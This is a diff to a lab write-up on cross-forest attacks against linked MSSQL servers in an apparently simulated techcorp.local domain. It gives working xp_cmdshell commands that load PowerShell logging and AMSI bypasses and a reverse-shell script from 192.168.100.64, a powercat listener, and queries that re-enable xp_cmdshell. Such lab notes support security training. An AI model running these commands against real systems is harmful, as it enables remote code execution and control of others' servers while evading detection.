@@ -3,7 +3,8 @@
 - [Hands-on 26: Cross Forest Attacks - MSSQL Servers](#hands-on-26-cross-forest-attacks---mssql-servers)
   - [Tasks](#tasks)
   - [Enumeration](#enumeration)
-  - [RCE on DB-SQLSRV](#rce-on-db-sqlsrv)
+  - [Reverse shell from DB-SQLPROD](#reverse-shell-from-db-sqlprod)
+  - [Reverse shell from DB-SQLSRV](#reverse-shell-from-db-sqlsrv)
 
 ---
 
@@ -90,8 +91,22 @@ Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
 
 <br/>
 
+Try to remotely execute command on the SQL servers:
 
-## RCE on DB-SQLSRV
+```
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami && hostname'''
+```
+
+![picture 1](images/d4039a30f17a9b737cbb643b1bbf631401821efdbf128163bb039816ec8dca1d.png)  
+
+- Command executed on **DB-SQLPROD** (`192.168.23.25`)
+- However, the SQL user on **DB-SQLSRV** is `sa` - it is supposed to be able to execute command. Likely `xp_cmdshell` is not enabled.
+
+<br/>
+
+---
+
+## Reverse shell from DB-SQLPROD
 
 Locally serve tools:
 
@@ -109,16 +124,61 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 . C:\AD\Tools\powercat.ps1; powercat -l -v -p 443 -t 1000
 ```
 
+Use `Get-SQLServerLinkCrawl` to get a reverse shell from **DB-SQLPROD**:
+
+- `sbloggingbypass.txt` bypasses PowerShell logging
+- `amsibypass.txt` bypasses AMSI
+- `Invoke-POwerShellTcpEx.ps1`
+
+```
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt); iex (iwr -UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcpEx.ps1)"'''
+```
+
+![picture 2](images/950b86594643e9d3f750fa8d3272ef8e436b72c5991cc4ba147f3e9f1bba5d1d.png)  
+
 <br/>
+
+Enable `xp_cmdshell` on `db-sqlsrv` via `db-sqlprod` using `Invoke-SqlCmd`:
+
+```
+Invoke-SqlCmd -Query "execute ('sp_configure ''show advanced options'', 1; reconfigure;') AT ""db-sqlsrv"""
+```
+
+```
+Invoke-SqlCmd -Query "execute ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT ""db-sqlsrv"""
+```
+
+![picture 3](images/d8ef1cc0efb2c289a4609267b73924f80987d3842ab13c970e26e82fda238e60.png)  
+
+<br/>
+
+Then on the local machine, try to use `Get-SQLServerLinkCrawl` to remotely run commands using `xp_cmdshell` again:
+
+```
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami && hostname'''
+```
+
+![picture 4](images/d7839a8e98888e6dea23fb80e868fdb1f262dabea2eecdedff8d4cfa133070ca.png)  
+
+<br/>
+
+---
+
+## Reverse shell from DB-SQLSRV
 
 Use **heidisql.exe** to connect to `us-mssql`:
 
 ![picture 23](images/cfe22e441fed78154d6daffc58bc63975d70721b67d6b6465c3c4bdbc1a49b8c.png)  
 
 ```
-select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.64/Invoke-PowerShellTcpEx.ps1'''')"'')');
+select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.64/Invoke-PowerShellTcpEx.ps1'''')"'')');
 ```
 
-```
-select * from openquery("192.168.23.25",'select * from openquery("dbsqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcp.ps1)"'''''')');
-```
+![picture 5](images/2deab8b5c56d8502c737562775481a4c8486f3289713b6652ce5d573ccbc1331.png)  
+
+Note:
+`select @@version;` has to be there or otherwise it fails
+
+![picture 6](images/ca9bc0ff4dc4f55e3a4ba529aff2d14c36c093f0f3dea853c69bb1839dd466b6.png)  
+
+---
